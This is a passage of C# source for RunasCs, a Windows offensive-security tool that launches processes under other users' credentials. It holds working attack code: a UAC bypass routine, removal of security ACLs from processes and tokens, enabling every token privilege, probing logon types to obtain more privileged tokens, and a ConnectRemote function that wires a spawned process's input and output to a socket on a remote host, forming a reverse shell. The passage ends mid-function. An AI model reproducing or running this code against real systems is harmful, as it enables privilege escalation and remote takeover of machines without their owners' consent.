using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Sockets;
using System.Security.Principal;
using System.ComponentModel;
using System.Net;

public class RunasCsException : Exception
{
    private const string error_string = "[-] RunasCsException: ";

    private static string GetWin32ErrorString()
    {
        Console.Out.Flush();
        string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
        return errorMessage;
    }

    public RunasCsException(){}

    public RunasCsException(string message) : base(error_string + message) { }

    public RunasCsException(string win32FunctionName, bool returnWin32Error) : base(error_string + win32FunctionName + " failed with error code: " + GetWin32ErrorString()) {}
}

public class RunasCs
{
    private const Int32 Startf_UseStdHandles = 0x00000100;
    private const int TokenPrimary = 1;
    private const int TokenImpersonation = 2;
    private const int LOGON32_PROVIDER_DEFAULT = 0; 
    private const int LOGON32_PROVIDER_WINNT50 = 3;
    private const int LOGON32_LOGON_INTERACTIVE = 2;
    private const int LOGON32_LOGON_NETWORK = 3;
    private const int LOGON32_LOGON_BATCH = 4;
    private const int LOGON32_LOGON_SERVICE = 5;
    private const int LOGON32_LOGON_NETWORK_CLEARTEXT = 8;
    private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
    private const int ERROR_LOGON_TYPE_NOT_GRANTED = 1385;
    private const int BUFFER_SIZE_PIPE = 1048576;
    private const uint CREATE_NO_WINDOW = 0x08000000;
    private const uint CREATE_SUSPENDED = 0x00000004;
    private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
    private const uint DUPLICATE_SAME_ACCESS = 0x00000002;
    private const uint DACL_SECURITY_INFORMATION = 0x00000004;
    private const UInt32 LOGON_WITH_PROFILE = 1;
    private const UInt32 LOGON_NETCREDENTIALS_ONLY = 2;
    private const int GetCurrentProcess = -1;

    private IntPtr socket;
    private IntPtr hErrorWrite;
    private IntPtr hOutputRead;
    private IntPtr hOutputWrite;
    private WindowStationDACL stationDaclObj;
    private IntPtr hTokenPreviousImpersonatingThread;
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
         public Int32 cb;
         public string lpReserved;
         public string lpDesktop;
         public string lpTitle;
         public Int32 dwX;
         public Int32 dwY;
         public Int32 dwXSize;
         public Int32 dwYSize;
         public Int32 dwXCountChars;
         public Int32 dwYCountChars;
         public Int32 dwFillAttribute;
         public Int32 dwFlags;
         public Int16 wShowWindow;
         public Int16 cbReserved2;
         public IntPtr lpReserved2;
         public IntPtr hStdInput;
         public IntPtr hStdOutput;
         public IntPtr hStdError;
    }

    private struct ProcessInformation
    {
        public IntPtr process;
        public IntPtr thread;
        public int    processId;
        public int    threadId;
    }
    
    [StructLayout(LayoutKind.Sequential)] 
    private struct SECURITY_ATTRIBUTES
    {
        public int    Length;
        public IntPtr lpSecurityDescriptor;
        public bool   bInheritHandle;
    }
    
    private enum SECURITY_IMPERSONATION_LEVEL 
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WSAData
    {
        internal short wVersion;
        internal short wHighVersion;
        internal short iMaxSockets;
        internal short iMaxUdpDg;
        internal IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        internal string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        internal string szSystemStatus;
    }

    private enum SE_OBJECT_TYPE
    {
        SE_UNKNOWN_OBJECT_TYPE = 0,
        SE_FILE_OBJECT,
        SE_SERVICE,
        SE_PRINTER,
        SE_REGISTRY_KEY,
        SE_LMSHARE,
        SE_KERNEL_OBJECT,
        SE_WINDOW_OBJECT,
        SE_DS_OBJECT,
        SE_DS_OBJECT_ALL,
        SE_PROVIDER_DEFINED_OBJECT,
        SE_WMIGUID_OBJECT,
        SE_REGISTRY_WOW64_32KEY
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROFILEINFO
    {
        public int dwSize;
        public int dwFlags;
        [MarshalAs(UnmanagedType.LPTStr)]
        public String lpUserName;
        [MarshalAs(UnmanagedType.LPTStr)]
        public String lpProfilePath;
        [MarshalAs(UnmanagedType.LPTStr)]
        public String lpDefaultPath;
        [MarshalAs(UnmanagedType.LPTStr)]
        public String lpServerName;
        [MarshalAs(UnmanagedType.LPTStr)]
        public String lpPolicyPath;
        public IntPtr hProfile;
    }

    [DllImport("Kernel32.dll", SetLastError=true)]
    private static extern bool CloseHandle(IntPtr handle);
    
    [DllImport("Kernel32.dll", SetLastError=true)]
    private static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetThreadToken(ref IntPtr pHandle, IntPtr hToken);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int ResumeThread(IntPtr hThread);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool RevertToSelf();
    
    [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName,[MarshalAs(UnmanagedType.LPStr)] string pszDomain,[MarshalAs(UnmanagedType.LPStr)] string pszPassword,int dwLogonType,int dwLogonProvider,ref IntPtr phToken);
    
    [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx", SetLastError = true)]
    private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, IntPtr lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, int TokenType, ref IntPtr DuplicateTokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    private static extern bool CreateProcessWithLogonW(String userName,String domain,String password,UInt32 logonFlags,String applicationName,String commandLine,uint creationFlags,UInt32 environment,String currentDirectory,ref STARTUPINFO startupInfo,out  ProcessInformation processInformation);
    
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    private static extern bool CreateProcessAsUser(IntPtr hToken,string lpApplicationName,string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles,uint dwCreationFlags,IntPtr lpEnvironment,string lpCurrentDirectory,ref STARTUPINFO lpStartupInfo,out ProcessInformation lpProcessInformation);  

    [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern uint SetSecurityInfo(IntPtr handle, SE_OBJECT_TYPE ObjectType, uint SecurityInfo, IntPtr psidOwner, IntPtr psidGroup, IntPtr pDacl, IntPtr pSacl);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

    [DllImport("kernel32.dll")]
    private static extern bool SetNamedPipeHandleState(IntPtr hNamedPipe, ref UInt32 lpMode, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("userenv.dll", SetLastError=true, CharSet = CharSet.Auto)]
    private static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit );

    [DllImport("userenv.dll", SetLastError=true, CharSet = CharSet.Auto)]
    private static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);

    [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool GetUserProfileDirectory(IntPtr hToken, StringBuilder path, ref int dwSize);

    [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool LoadUserProfile(IntPtr hToken, ref PROFILEINFO lpProfileInfo);

    [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool UnloadUserProfile(IntPtr hToken, IntPtr hProfile);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags);

    [DllImport("ws2_32.dll", SetLastError = true)]
    private static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);

    [DllImport("ws2_32.dll", SetLastError = true)]
    private static extern ushort htons(ushort hostshort);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    private static extern Int32 WSAGetLastError();

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
    private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int closesocket(IntPtr s);
    
    private string GetProcessFunction(int createProcessFunction){
        if(createProcessFunction == 0)
            return "CreateProcessAsUserW()";
        if(createProcessFunction == 1)
            return "CreateProcessWithTokenW()";
        return "CreateProcessWithLogonW()";
    }
    
    private bool CreateAnonymousPipeEveryoneAccess(ref IntPtr hReadPipe, ref IntPtr hWritePipe)
    {
        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        sa.Length = Marshal.SizeOf(sa);
        sa.lpSecurityDescriptor = IntPtr.Zero;
        sa.bInheritHandle = true;
        if (CreatePipe(out hReadPipe, out hWritePipe, ref sa, (uint)BUFFER_SIZE_PIPE))
            return true;
        return false;
    }
    
    private string ReadOutputFromPipe(IntPtr hReadPipe)
    {
        string output = "";
        uint dwBytesRead = 0;
        byte[] buffer = new byte[BUFFER_SIZE_PIPE];
        if(!ReadFile(hReadPipe, buffer, BUFFER_SIZE_PIPE, out dwBytesRead, IntPtr.Zero)){
            output += "No output received from the process.\r\n";
        }
        output += Encoding.Default.GetString(buffer, 0, (int)dwBytesRead);
        return output;
    }

    private IntPtr ConnectRemote(string[] remote)
    {
        int port = 0;
        int error = 0;
        string host = remote[0];

        try {
            port = Convert.ToInt32(remote[1]);
        } catch {
            throw new RunasCsException("Specified port is invalid: " + remote[1]);
        }

        WSAData data;
        if( WSAStartup(2 << 8 | 2, out data) != 0 ) {
            error = WSAGetLastError();
            throw new RunasCsException(String.Format("WSAStartup failed with error code: {0}", error));
        }

        IntPtr socket = IntPtr.Zero;
        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);

        SOCKADDR_IN sockinfo = new SOCKADDR_IN();
        sockinfo.sin_family = (short)2;
        sockinfo.sin_addr = BitConverter.ToUInt32(((IPAddress.Parse(host)).GetAddressBytes()), 0);
        sockinfo.sin_port = (short)htons((ushort)port);

        if ( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
            error = WSAGetLastError();
            throw new RunasCsException(String.Format("WSAConnect failed with error code: {0}", error));
        }

        return socket;
    }

    private bool ImpersonateLoggedOnUserWithProperIL(IntPtr hToken, out IntPtr hTokenDuplicate) {
        IntPtr hTokenDuplicateLocal = new IntPtr(0);
        bool result = false;
        // if our main thread was already impersonating remember to restore the previous thread token
        if (WindowsIdentity.GetCurrent(true) != null)
            this.hTokenPreviousImpersonatingThread = WindowsIdentity.GetCurrent(true).Token;
        if (!DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenImpersonation, ref hTokenDuplicateLocal))
            throw new RunasCsException("DuplicateTokenEx", true);
        if(AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token) < AccessToken.GetTokenIntegrityLevel(hTokenDuplicateLocal))
            AccessToken.SetTokenIntegrityLevel(hTokenDuplicateLocal, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token));
        result = ImpersonateLoggedOnUser(hTokenDuplicateLocal);
        hTokenDuplicate = hTokenDuplicateLocal;
        return result;
    }

    private void RevertToSelfCustom() {
        RevertToSelf();
        if (this.hTokenPreviousImpersonatingThread != IntPtr.Zero) 
            ImpersonateLoggedOnUser(this.hTokenPreviousImpersonatingThread);
    }

    private void GetUserEnvironmentBlock(IntPtr hToken, string username, bool forceProfileCreation, bool userProfileExists, out IntPtr lpEnvironment)
    {
        bool result = false;
        lpEnvironment = new IntPtr(0);
        PROFILEINFO profileInfo = new PROFILEINFO();
        IntPtr hTokenDuplicate;
        if (forceProfileCreation || userProfileExists) {
            profileInfo.dwSize = Marshal.SizeOf(profileInfo);
            profileInfo.lpUserName = username;
            result = LoadUserProfile(hToken, ref profileInfo);
            if (result == false && Marshal.GetLastWin32Error() == 1314)
                Console.Out.WriteLine("[*] Warning: LoadUserProfile failed due to insufficient permissions");
        }
        ImpersonateLoggedOnUserWithProperIL(hToken, out hTokenDuplicate);
        try {
            CreateEnvironmentBlock(out lpEnvironment, hToken, false);
        }
        catch {
            result = false;
        }
        RevertToSelfCustom();
        CloseHandle(hTokenDuplicate);
        if (result && (forceProfileCreation || userProfileExists)) UnloadUserProfile(hToken, profileInfo.hProfile);
    }

    private bool IsUserProfileCreated(string username, string password, string domainName, int logonType) {
        bool result = false;
        IntPtr hToken = IntPtr.Zero, hTokenDuplicate = IntPtr.Zero;
        int logonProvider = LOGON32_PROVIDER_DEFAULT;
        if (logonType == LOGON32_LOGON_NEW_CREDENTIALS) logonProvider = LOGON32_PROVIDER_WINNT50;
        result = LogonUser(username, domainName, password, logonType, logonProvider, ref hToken);
        if (result == false)
            throw new RunasCsException("LogonUser", true);
        ImpersonateLoggedOnUserWithProperIL(hToken, out hTokenDuplicate);
        try
        {
            int dwSize = 0;
            GetUserProfileDirectory(hToken, null, ref dwSize);
            StringBuilder profileDir = new StringBuilder(dwSize);
            result = GetUserProfileDirectory(hToken, profileDir, ref dwSize);
        }
        catch {
            result = false;
        }
        RevertToSelfCustom();
        CloseHandle(hToken);
        CloseHandle(hTokenDuplicate);
        return result;
    }

    // UAC bypass discussed in this UAC quiz tweet --> https://twitter.com/splinter_code/status/1458054161472307204
    // thanks @winlogon0 for the implementation --> https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode2.cs
    private bool CreateProcessWithLogonWUacBypass(int logonType, uint logonFlags, string username, string domainName, string password, string processPath, string commandLine, ref STARTUPINFO startupInfo, out ProcessInformation processInfo) {
        bool result = false;
        IntPtr hToken = new IntPtr(0);
        if (!LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken))
            throw new RunasCsException("CreateProcessWithLogonWUacBypass: LogonUser", true);
        // here we set the IL of the new token equal to our current process IL. Needed or seclogon will fail.
        AccessToken.SetTokenIntegrityLevel(hToken, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token));
        // remove acl to our current process. Needed for seclogon
        SetSecurityInfo((IntPtr)GetCurrentProcess, SE_OBJECT_TYPE.SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(hToken))
        {
            if (domainName == "") // fixing bugs in seclogon ...
                domainName = ".";
            result = CreateProcessWithLogonW(username, domainName, password, logonFlags | LOGON_NETCREDENTIALS_ONLY, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
        }
        CloseHandle(hToken);
        return result;
    }

    private string ParseCommonProcessesInCommandline(string commandline) {
        string commandlineRet = commandline;
        string[] args = commandline.Split(' ');
        if (args[0].ToLower() == "cmd" || args[0].ToLower() == "cmd.exe") {
            args[0] = Environment.GetEnvironmentVariable("COMSPEC");
            commandlineRet = string.Join(" ", args);
        }
        if (args[0].ToLower() == "powershell" || args[0].ToLower() == "powershell.exe") {
            args[0] = Environment.GetEnvironmentVariable("WINDIR") + @"\System32\WindowsPowerShell\v1.0\powershell.exe";
            commandlineRet = string.Join(" ", args);
        }
        return commandlineRet;
    }

    private bool IsLimitedUserLogon(IntPtr hToken, string username, string domainName, string password, out int logonTypeNotFiltered) {
        bool isLimitedUserLogon = false;
        bool isTokenUACFiltered = false;
        IntPtr hTokenNetwork = IntPtr.Zero;
        IntPtr hTokenBatch = IntPtr.Zero;
        IntPtr hTokenService = IntPtr.Zero;
        logonTypeNotFiltered = 0;
        isTokenUACFiltered = AccessToken.IsFilteredUACToken(hToken);
        if (isTokenUACFiltered)
        {
            logonTypeNotFiltered = LOGON32_LOGON_NETWORK_CLEARTEXT;
            isLimitedUserLogon = true;
        }
        else {
            // Check differences between the requested logon type and non-filtered logon types (Network, Batch, Service)
            // If IL mismatch, the user has potentially more privileges than the requested logon
            AccessToken.IntegrityLevel userTokenIL = AccessToken.GetTokenIntegrityLevel(hToken);
            if (LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_PROVIDER_DEFAULT, ref hTokenNetwork) && userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenNetwork))
            {
                isLimitedUserLogon = true;
                logonTypeNotFiltered = LOGON32_LOGON_NETWORK_CLEARTEXT;
            }
            else if (!isLimitedUserLogon && LogonUser(username, domainName, password, LOGON32_LOGON_SERVICE, LOGON32_PROVIDER_DEFAULT, ref hTokenService) && userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenService))
            {
                // we check Service logon because by default it has the SeImpersonate privilege, available only in High IL
                isLimitedUserLogon = true;
                logonTypeNotFiltered = LOGON32_LOGON_SERVICE;
            }
            else if (!isLimitedUserLogon && LogonUser(username, domainName, password, LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, ref hTokenBatch) && userTokenIL < AccessToken.GetTokenIntegrityLevel(hTokenBatch))
            {
                isLimitedUserLogon = true;
                logonTypeNotFiltered = LOGON32_LOGON_BATCH;
            }
            if (hTokenNetwork != IntPtr.Zero) CloseHandle(hTokenNetwork);
            if (hTokenBatch != IntPtr.Zero) CloseHandle(hTokenBatch);
            if (hTokenService != IntPtr.Zero) CloseHandle(hTokenService);
        }
        return isLimitedUserLogon;
    }

    private void CheckAvailableUserLogonType(string username, string password, string domainName, int logonType, int logonProvider) {
        IntPtr hTokenCheck1 = IntPtr.Zero;
        if (!LogonUser(username, domainName, password, logonType, logonProvider, ref hTokenCheck1)) {
            if (Marshal.GetLastWin32Error() == ERROR_LOGON_TYPE_NOT_GRANTED) {
                int availableLogonType = 0;
                int[] logonTypeTryOrder = new int[] { LOGON32_LOGON_SERVICE, LOGON32_LOGON_BATCH, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_LOGON_NETWORK, LOGON32_LOGON_INTERACTIVE};
                foreach (int logonTypeTry in logonTypeTryOrder)
                {
                    IntPtr hTokenCheck2 = IntPtr.Zero;
                    if (LogonUser(username, domainName, password, logonTypeTry, logonProvider, ref hTokenCheck2)) {
                        availableLogonType = logonTypeTry;
                        if (AccessToken.GetTokenIntegrityLevel(hTokenCheck2) > AccessToken.IntegrityLevel.Medium)
                        {
                            availableLogonType = logonTypeTry;
                            CloseHandle(hTokenCheck2);
                            break;
                        }
                    }
                    if (hTokenCheck2 != IntPtr.Zero) CloseHandle(hTokenCheck2);
                }
                if (availableLogonType != 0)
                    throw new RunasCsException(String.Format("Selected logon type '{0}' is not granted to the user '{1}'. Use available logon type '{2}'.", logonType, username, availableLogonType.ToString()));
                else
                    throw new RunasCsException("LogonUser", true);
            }
            throw new RunasCsException("LogonUser", true);
        }
        if (hTokenCheck1 != IntPtr.Zero) CloseHandle(hTokenCheck1);
    }

    private void RunasSetupStdHandlesForProcess(uint processTimeout, string[] remote, ref STARTUPINFO startupInfo, out IntPtr hOutputWrite, out IntPtr hErrorWrite, out IntPtr hOutputRead, out IntPtr socket) {
        IntPtr hOutputReadTmpLocal = IntPtr.Zero;
        IntPtr hOutputWriteLocal = IntPtr.Zero;
        IntPtr hErrorWriteLocal = IntPtr.Zero;
        IntPtr hOutputReadLocal = IntPtr.Zero;
        IntPtr socketLocal = IntPtr.Zero;
        if (processTimeout > 0)
        {
            IntPtr hCurrentProcess = Process.GetCurrentProcess().Handle;
            if (!CreateAnonymousPipeEveryoneAccess(ref hOutputReadTmpLocal, ref hOutputWriteLocal))
                throw new RunasCsException("CreatePipe", true);
            if (!DuplicateHandle(hCurrentProcess, hOutputWriteLocal, hCurrentProcess, out hErrorWriteLocal, 0, true, DUPLICATE_SAME_ACCESS))
                throw new RunasCsException("DuplicateHandle stderr write pipe", true);
            if (!DuplicateHandle(hCurrentProcess, hOutputReadTmpLocal, hCurrentProcess, out hOutputReadLocal, 0, false, DUPLICATE_SAME_ACCESS))
                throw new RunasCsException("DuplicateHandle stdout read pipe", true);
            CloseHandle(hOutputReadTmpLocal);
            hOutputReadTmpLocal = IntPtr.Zero;
            UInt32 PIPE_NOWAIT = 0x00000001;
            if (!SetNamedPipeHandleState(hOutputReadLocal, ref PIPE_NOWAIT, IntPtr.Zero, IntPtr.Zero))
                throw new RunasCsException("SetNamedPipeHandleState", true);
            startupInfo.dwFlags = Startf_UseStdHandles;
            startupInfo.hStdOutput = hOutputWriteLocal;
            startupInfo.hStdError = hErrorWriteLocal;
        }
        else if (remote != null)
        {
            socketLocal = ConnectRemote(remote);
            startupInfo.dwFlags = Startf_UseStdHandles;
            startupInfo.hStdInput = socketLocal;
            startupInfo.hStdOutput = socketLocal;
            startupInfo.hStdError = socketLocal;
        }
        hOutputWrite = hOutputWriteLocal;
        hErrorWrite = hErrorWriteLocal;
        hOutputRead = hOutputReadLocal;
        socket = socketLocal;
    }

    private void RunasRemoteImpersonation(string username, string domainName, string password, int logonType, int logonProvider, string commandLine, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {
        IntPtr hToken = IntPtr.Zero;
        IntPtr hTokenDupImpersonation = IntPtr.Zero;
        IntPtr lpEnvironment = IntPtr.Zero;
        if (!LogonUser(username, domainName, password, logonType, logonProvider, ref hToken))
            throw new RunasCsException("LogonUser", true);
        if (IsLimitedUserLogon(hToken, username, domainName, password, out logonTypeNotFiltered))
            Console.Out.WriteLine(String.Format("[*] Warning: Logon for user '{0}' is limited. Use the --logon-type value '{1}' to obtain a more privileged token", username, logonTypeNotFiltered));
        if (!DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenImpersonation, ref hTokenDupImpersonation))
            throw new RunasCsException("DuplicateTokenEx", true);
        if (AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token) < AccessToken.GetTokenIntegrityLevel(hTokenDupImpersonation))
            AccessToken.SetTokenIntegrityLevel(hTokenDupImpersonation, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token));
        // enable all privileges assigned to the token
        AccessToken.EnableAllPrivileges(hTokenDupImpersonation);
        CreateEnvironmentBlock(out lpEnvironment, hToken, false);
        if (!CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo))
            throw new RunasCsException("CreateProcess", true);
        IntPtr hTokenProcess = IntPtr.Zero;
        if (!OpenProcessToken(processInfo.process, AccessToken.TOKEN_ALL_ACCESS, out hTokenProcess))
            throw new RunasCsException("OpenProcessToken", true);
        AccessToken.SetTokenIntegrityLevel(hTokenProcess, AccessToken.GetTokenIntegrityLevel(hTokenDupImpersonation));
        // this will solve some permissions errors when attempting to get the current process handle while impersonating
        SetSecurityInfo(processInfo.process, SE_OBJECT_TYPE.SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        // this will solve some issues, e.g. Access Denied errors when running whoami.exe
        SetSecurityInfo(hTokenProcess, SE_OBJECT_TYPE.SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (!SetThreadToken(ref processInfo.thread, hTokenDupImpersonation))
            throw new RunasCsException("SetThreadToken", true);
        ResumeThread(processInfo.thread);
        CloseHandle(hToken);
        CloseHandle(hTokenDupImpersonation);
        CloseHandle(hTokenProcess);
        if (lpEnvironment != IntPtr.Zero) DestroyEnvironmentBlock(lpEnvironment);
    }

    private void RunasCreateProcessWithLogonW(string username, string domainName, string password, int logonType, uint logonFlags, string commandLine, bool bypassUac, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {
        if (logonType == LOGON32_LOGON_NEW_CREDENTIALS)
        {
            if (!CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo))
                throw new RunasCsException("CreateProcessWithLogonW logon type 9", true);
        }
        else if (bypassUac)
        {
            int logonTypeBypassUac;
            // the below logon types are not filtered by UAC, we allow login with them. Otherwise stick with NetworkCleartext
            if (logonType == LOGON32_LOGON_NETWORK || logonType == LOGON32_LOGON_BATCH || logonType == LOGON32_LOGON_SERVICE || logonType == LOGON32_LOGON_NETWORK_CLEARTEXT)
                logonTypeBypassUac = logonType;
            else
            {
                // Console.Out.WriteLine("[*] Warning: UAC Bypass is not compatible with logon type '" + logonType.ToString() + "'. Reverting to the NetworkCleartext logon type '8'. To force a specific logon type, use the flag combination --bypass-uac and --logon-type.");
                logonTypeBypassUac = LOGON32_LOGON_NETWORK_CLEARTEXT;
            }
            if (!CreateProcessWithLogonWUacBypass(logonTypeBypassUac, logonFlags, username, domainName, password, null, commandLine, ref startupInfo, out processInfo))
                throw new RunasCsException("CreateProcessWithLogonWUacBypass", true);
        }
        else
        {
            IntPtr hTokenUacCheck = new IntPtr(0);
            if (logonType != LOGON32_LOGON_INTERACTIVE)
                Console.Out.WriteLine("[*] Warning: The function CreateProcessWithLogonW is not compatible with the requested logon type '" + logonType.ToString() + "'. Reverting to the Interactive logon type '2'. To force a specific logon type, use the flag combination --remote-impersonation and --logon-type.");
            // we check if the user has been granted the logon type requested, if not we show a message suggesting which logon type can be used to succesfully logon
            CheckAvailableUserLogonType(username, password, domainName, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT);
            // we use the logon type 2 - Interactive because CreateProcessWithLogonW internally use this logon type for the logon 
            if (!LogonUser(username, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref hTokenUacCheck))
                throw new RunasCsException("LogonUser", true);
            if (IsLimitedUserLogon(hTokenUacCheck, username, domainName, password, out logonTypeNotFiltered))
                Console.Out.WriteLine(String.Format("[*] Warning: The logon for user '{0}' is limited. Use the flag combination --bypass-uac and --logon-type '{1}' to obtain a more privileged token.", username, logonTypeNotFiltered));
            CloseHandle(hTokenUacCheck);
            if (!CreateProcessWithLogonW(username, domainName, password, logonFlags, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo))
                throw new RunasCsException("CreateProcessWithLogonW logon type 2", true);
        }
    }

    private void RunasCreateProcessWithTokenW(string username, string domainName, string password, string commandLine, int logonType, uint logonFlags, int logonProvider, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {
        IntPtr hToken = IntPtr.Zero;
        IntPtr hTokenDuplicate = IntPtr.Zero;
        if (!LogonUser(username, domainName, password, logonType, logonProvider, ref hToken))
            throw new RunasCsException("LogonUser", true);
        if (!DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenPrimary, ref hTokenDuplicate))
            throw new RunasCsException("DuplicateTokenEx", true);
        if (IsLimitedUserLogon(hTokenDuplicate, username, domainName, password, out logonTypeNotFiltered))
